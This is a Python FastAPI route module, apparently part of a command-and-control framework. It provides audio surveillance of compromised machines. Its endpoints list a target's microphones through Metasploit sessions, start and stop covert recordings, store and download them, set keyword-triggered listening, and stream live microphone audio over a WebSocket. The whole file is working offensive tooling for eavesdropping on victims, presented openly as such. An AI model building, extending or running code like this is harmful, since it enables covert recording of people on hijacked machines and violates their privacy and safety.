"""
Routes /api/audio — C2 Audio Capture.

List microphones, start/stop recordings, keyword detection, live audio streaming.
"""
from __future__ import annotations

import base64
import json
import logging
from pathlib import Path
from typing import Optional

from fastapi import APIRouter, Depends, HTTPException, Query, WebSocket, WebSocketDisconnect
from fastapi.responses import FileResponse
from pydantic import BaseModel
from sqlalchemy.orm import Session

from core.engines.audio_capture import audio_capture_engine
from database.db import get_db

logger = logging.getLogger(__name__)
router = APIRouter()


# ── Pydantic request models ───────────────────────────────────────────────────

class StartRecordingRequest(BaseModel):
    session_id: str
    mic_id: str = "default"
    duration: int = 30
    quality: str = "medium"   # low | medium | high


class KeywordRequest(BaseModel):
    session_id: str
    keyword: str


# ── Microphones ───────────────────────────────────────────────────────────────

@router.get("/microphones/{session_id}")
async def list_microphones(session_id: str):
    """
    List microphones available on the target via MSF session,
    or local system microphones if session_id starts with 'local'.
    """
    try:
        mics = await audio_capture_engine.list_microphones(session_id)
        return {"success": True, "session_id": session_id, "microphones": mics, "count": len(mics)}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# ── Recording ─────────────────────────────────────────────────────────────────

@router.post("/record/start")
async def start_recording(req: StartRecordingRequest, db: Session = Depends(get_db)):
    """
    Start audio recording via Metasploit record_mic module or local arecord/ffmpeg fallback.
    Returns job_id to track the recording.
    """
    if req.duration < 1 or req.duration > 3600:
        raise HTTPException(status_code=400, detail="Duration must be between 1 and 3600 seconds")
    if req.quality not in ("low", "medium", "high"):
        raise HTTPException(status_code=400, detail="Quality must be: low | medium | high")

    result = await audio_capture_engine.start_recording(
        session_id=req.session_id,
        mic_id=req.mic_id,
        duration=req.duration,
        quality=req.quality,
    )

    if not result.get("success"):
        raise HTTPException(status_code=500, detail=result.get("error", "Recording failed to start"))

    # Persist to DB in background (non-blocking)
    try:
        recording_id = await audio_capture_engine.save_recording_to_db(
            session_id=req.session_id,
            file_path=result["file_path"],
            duration=req.duration,
            mic_name=req.mic_id,
            file_size=0,
        )
        result["recording_id"] = recording_id
    except Exception as e:
        logger.warning(f"DB persist failed: {e}")

    return result


@router.post("/record/stop/{job_id}")
async def stop_recording(job_id: str, db: Session = Depends(get_db)):
    """
    Stop an active recording job.
    Finalizes the audio file and updates DB metadata.
    """
    result = await audio_capture_engine.stop_recording(job_id)
    if not result.get("success"):
        raise HTTPException(status_code=404, detail=result.get("error", "Job not found"))

    # Update file_size in DB
    if result.get("file_size") and result.get("file_path"):
        try:
            from database.models import AudioRecording
            rec = db.query(AudioRecording).filter(
                AudioRecording.file_path == result["file_path"]
            ).first()
            if rec:
                rec.file_size = result["file_size"]
                db.commit()
        except Exception as e:
            logger.warning(f"DB update failed: {e}")

    return result


# ── List & manage recordings ──────────────────────────────────────────────────

@router.get("/recordings")
async def list_recordings(session_id: Optional[str] = Query(default=None)):
    """
    List all audio recordings.
    Optional ?session_id= filter to show recordings from a specific C2 session.
    """
    recordings = await audio_capture_engine.get_recordings(session_id=session_id)
    return {"success": True, "recordings": recordings, "count": len(recordings)}


@router.delete("/recordings/{recording_id}")
async def delete_recording(recording_id: str):
    """Delete a recording file and its DB entry."""
    deleted = await audio_capture_engine.delete_recording(recording_id)
    if not deleted:
        raise HTTPException(status_code=404, detail=f"Recording {recording_id} not found")
    return {"success": True, "recording_id": recording_id, "deleted": True}


@router.get("/download/{recording_id}")
async def download_recording(recording_id: str):
    """Download an audio recording file."""
    recordings = await audio_capture_engine.get_recordings()
    rec = next((r for r in recordings if r.get("recording_id") == recording_id), None)

    if not rec:
        # Fallback: try direct path
        p = audio_capture_engine.RECORDINGS_DIR / f"{recording_id}.wav"
        if p.exists():
            return FileResponse(str(p), media_type="audio/wav", filename=p.name)
        raise HTTPException(status_code=404, detail=f"Recording {recording_id} not found")

    file_path = rec.get("file_path", "")
    if not file_path or not Path(file_path).exists():
        raise HTTPException(status_code=404, detail="Recording file not found on disk")

    ext = Path(file_path).suffix.lower()
    media_type = "audio/wav" if ext == ".wav" else "audio/mpeg" if ext == ".mp3" else "application/octet-stream"
    return FileResponse(file_path, media_type=media_type, filename=Path(file_path).name)


# ── Keyword detection ─────────────────────────────────────────────────────────

@router.post("/keyword")
async def setup_keyword_detection(req: KeywordRequest):
    """
    Setup keyword detection monitor.
    Uses pocketsphinx if available, falls back to periodic STT polling.
    """
    if not req.keyword.strip():
        raise HTTPException(status_code=400, detail="keyword cannot be empty")

    result = await audio_capture_engine.detect_keyword(
        session_id=req.session_id,
        keyword=req.keyword.strip(),
    )
    return result


# ── Live audio WebSocket ──────────────────────────────────────────────────────

@router.websocket("/stream/{session_id}")
async def audio_stream_ws(websocket: WebSocket, session_id: str, token: Optional[str] = Query(default=None)):
    """
    Live audio streaming WebSocket.
    Authenticate via ?token= query parameter (JWT).
    Streams raw PCM audio (s16le, 16kHz, mono) as binary frames.
    """
    # JWT authentication via query parameter
    if token:
        try:
            from core.auth.jwt_handler import decode_access_token
            decode_access_token(token)
        except Exception:
            await websocket.close(code=4001)
            return
    else:
        await websocket.close(code=4001)
        return

    await websocket.accept()
    stream_id = await audio_capture_engine.stream_audio_start(session_id)

    try:
        await websocket.send_json({
            "type": "stream_started",
            "stream_id": stream_id,
            "session_id": session_id,
            "format": "s16le",
            "sample_rate": 16000,
            "channels": 1,
        })

        while True:
            chunk = await audio_capture_engine.get_stream_chunk(stream_id, timeout=2.0)
            if chunk:
                await websocket.send_bytes(chunk)
            else:
                # Keepalive ping
                try:
                    await websocket.send_json({"type": "ping"})
                except Exception:
                    break

    except WebSocketDisconnect:
        pass
    except Exception as e:
        logger.error(f"Audio WS error: {e}")
    finally:
        await audio_capture_engine.stop_stream(stream_id)
